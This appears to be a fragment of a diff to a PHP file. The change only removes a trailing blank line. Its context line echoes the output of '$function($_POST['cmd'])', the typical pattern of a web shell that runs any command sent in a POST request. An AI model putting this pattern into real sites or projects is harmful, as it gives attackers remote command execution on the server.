@@ -21,4 +21,3 @@ echo "".$function($_POST['cmd'])."</pre></body></html>";
 
 
 ?>
-
